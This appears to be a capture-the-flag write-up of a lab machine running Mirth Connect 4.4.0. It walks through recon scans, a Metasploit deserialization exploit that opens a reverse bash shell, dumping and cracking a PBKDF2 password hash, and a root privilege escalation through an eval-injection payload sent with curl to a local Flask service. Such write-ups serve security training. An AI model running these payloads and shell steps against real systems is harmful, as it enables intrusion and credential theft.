```bash
== ferox_http_80.txt ==
200      GET        2l     1297w    89476c http://10.129.244.184/js/jquery-3.5.1.min.js
200      GET      309l     1083w    17155c http://10.129.244.184/webadmin/Index.action
200      GET     3554l     9214w    81805c http://10.129.244.184/css/bootstrap.css
200      GET        3l       18w      904c http://10.129.244.184/images/NG_MC_Icon_16x16.png
200      GET     4982l    31372w  3886616c http://10.129.244.184/images/MirthConnect_Logo_WordMark_Big.png
200      GET       82l      217w     2532c http://10.129.244.184/
200      GET      925l     1839w    15797c http://10.129.244.184/css/main.css
302      GET        0l        0w        0c http://10.129.244.184/css => http://10.129.244.184/css/
302      GET        0l        0w        0c http://10.129.244.184/images => http://10.129.244.184/images/
302      GET        0l        0w        0c http://10.129.244.184/installers => http://10.129.244.184/installers/
302      GET        0l        0w        0c http://10.129.244.184/js => http://10.129.244.184/js/
302      GET        0l        0w        0c http://10.129.244.184/webadmin => http://10.129.244.184/webadmin/

== ferox_https_443.txt ==
200      GET        2l     1297w    89476c https://10.129.244.184/js/jquery-3.5.1.min.js
200      GET      319l     1096w    17779c https://10.129.244.184/webadmin/Index.action
200      GET     3554l     9214w    81805c https://10.129.244.184/css/bootstrap.css
200      GET        3l       18w      904c https://10.129.244.184/images/NG_MC_Icon_16x16.png
200      GET     4982l    31372w  3886616c https://10.129.244.184/images/MirthConnect_Logo_WordMark_Big.png
200      GET       82l      217w     2532c https://10.129.244.184/
200      GET      925l     1839w    15797c https://10.129.244.184/css/main.css
302      GET        0l        0w        0c https://10.129.244.184/api => https://10.129.244.184/api/
302      GET        0l        0w        0c https://10.129.244.184/css => https://10.129.244.184/css/
302      GET        0l        0w        0c https://10.129.244.184/images => https://10.129.244.184/images/
302      GET        0l        0w        0c https://10.129.244.184/installers => https://10.129.244.184/installers/
302      GET        0l        0w        0c https://10.129.244.184/js => https://10.129.244.184/js/
302      GET        0l        0w        0c https://10.129.244.184/webadmin => https://10.129.244.184/webadmin/

== nmap_results.txt ==
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 06:36 -0400
Nmap scan report for 10.129.244.184
Host is up (0.062s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http Jetty
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
6661/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.95 seconds

============================================
  RECON SUMMARY
  Target:    10.129.244.184
  DNS:       none
  Generated: 2026-04-05 06:42:16
============================================

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp   ssh          OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
  80/tcp   http         Jetty
  443/tcp  ssl/http     Jetty
  6661/tcp unknown      6661/tcp open  unknown

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80
  HTTPS:  443

--------------------------------------------
  SUBDOMAINS  (0 found)
--------------------------------------------
  none

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------
  200  http://10.129.244.184/
  200  http://10.129.244.184/css/bootstrap.css
  200  http://10.129.244.184/css/main.css
  200  http://10.129.244.184/images/MirthConnect_Logo_WordMark_Big.png
  200  http://10.129.244.184/images/NG_MC_Icon_16x16.png
  200  http://10.129.244.184/js/jquery-3.5.1.min.js
  200  http://10.129.244.184/webadmin/Index.action
  200  https://10.129.244.184/
  200  https://10.129.244.184/css/bootstrap.css
  200  https://10.129.244.184/css/main.css
  200  https://10.129.244.184/images/MirthConnect_Logo_WordMark_Big.png
  200  https://10.129.244.184/images/NG_MC_Icon_16x16.png
  200  https://10.129.244.184/js/jquery-3.5.1.min.js
  200  https://10.129.244.184/webadmin/Index.action
  302  http://10.129.244.184/css/
  302  http://10.129.244.184/images/
  302  http://10.129.244.184/installers/
  302  http://10.129.244.184/js/
  302  http://10.129.244.184/webadmin/
  302  https://10.129.244.184/api/
  302  https://10.129.244.184/css/
  302  https://10.129.244.184/images/
  302  https://10.129.244.184/installers/
  302  https://10.129.244.184/js/
  302  https://10.129.244.184/webadmin/

============================================

=== Done! Results: /home/kali/github/ctf_tool/results/10.129.244.184/ ===
```


Ok so we go to the website and it's a mirth connect administation panel. I tried to look for the version but wasnt able to find it. We were able to download the launcher and see that the version is 4.4.0

```bash
<application-desc main-class="com.mirth.connect.client.ui.Mirth">
        <argument>https://10.129.244.184:443</argument>
        <argument>4.4.0</argument>
    </application-desc>
```

https://nvd.nist.gov/vuln/detail/cve-2023-43208

Apparently the version BEFORE 4.4.1 is vulnerable to unauthenticated remote code exection. It's caused by an imcomplete patch of CVE-2023-37679

I found an exploit of the CVE on msfconsole.

```bash
msf > search mirth

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/mirth_connect_cve_2023_43208  2023-10-25       excellent  Yes    Mirth Connect Deserialization RCE
   1    \_ target: Unix Command                        .                .          .      .
   2    \_ target: Windows Command  

```

```bash
msf exploit(multi/http/mirth_connect_cve_2023_43208) > exploit
[*] Started reverse TCP handler on 10.10.14.175:6666 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
[*] Executing cmd/linux/http/x64/meterpreter/reverse_tcp (Unix Command)
[+] The target appears to have executed the payload.
[*] Exploit completed, but no session was created.
```

I just changed the listener to "set payload cmd/unix/reverse_bash" and it worked and we got a shell



```bash
msf exploit(multi/http/mirth_connect_cve_2023_43208) > exploit
[*] Started reverse TCP handler on 10.10.14.175:6666 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Executing cmd/unix/reverse_bash (Unix Command)
[+] The target appears to have executed the payload.
[*] Command shell session 1 opened (10.10.14.175:6666 -> 10.129.244.184:54852) at 2026-04-05 07:15:17 -0400

id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

After enumerating the machine I found credentials
```bash
# database credentials
database.username = mirthdb
database.password = MirthPass123!
```

We were able to log in

```bash
MariaDB [mc_bdd_prod]> select * from PERSON;
select * from PERSON;
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
select * from PERSON_PASSWORD;                                                                                                       
+-----------+----------------------------------------------------------+---------------------+                                       
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |                                       
+-----------+----------------------------------------------------------+---------------------+                                       
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.000 sec)
```

Let's see if we can crack the pass with hashcat.

```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

After doing research i found that mirth connect uses PBKDF2 to store the passwords in its database. This is known since its opensource.

I split it into two

```bash
echo 'bbff8b0413949da7' | xxd -r -p | base64
u/+LBBOUnac=
                                                                                                                    
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ echo '62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb' | xxd -r -p | base64
YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```
 The first part is the salt and the other part is the hash aka the password

 
 ```bash
cat hash   
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=

and now we crack it

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```

Ok now we can most likely log in via ssh to serdic


I checked the psaux and saw a weird script.


```bash
sedric@interpreter:/usr/local/bin$ ls -la
total 12
drwxr-xr-x  2 root root   4096 Feb 16 15:42 .
drwxr-xr-x 11 root root   4096 Feb 16 15:42 ..
-rwxr-----  1 root sedric 2332 Sep 19  2025 notif.py
```
It was running as root. 

```python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

Ok so ive already checked the ss -tunlp and we can port over the 127.0.0.1:54321 to our machine to access it since, we cant use curl on this machine and it checks if it was received from 127.0.0.1

```bash
ssh -L 54321:127.0.0.1:54321 sedric@ip
```

The vulnerable part is eval(f"...") since it passes user-controlled data.

Let's craft a test payload

```bash
curl -X POST http://127.0.0.1:54321/addPatient \
-H "Content-Type: application/xml" \
--data-binary '<patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>a</lastname><sender_app>a</sender_app><timestamp>a</timestamp><birth_date>01/01/2000</birth_date><gender>a</gender></patient>'
Patient uid=0(root) gid=0(root) groups=0(root)
 a (a), 26 years old, received from a at a
```
We can see that it's executed as root. We could use it to get a root shell or just print out the flag.


```bash
curl -X POST http://127.0.0.1:54321/addPatient \
-H "Content-Type: application/xml" \
--data-binary '<patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>a</lastname><sender_app>a</sender_app><timestamp>a</timestamp><birth_date>01/01/2000</birth_date><gender>a</gender></patient>'
Patient 4e96beea869555fb0520cffaf928e2bb
 a (a), 26 years old, received from a at a   
 ```

Ok we were able to grab the flag. 
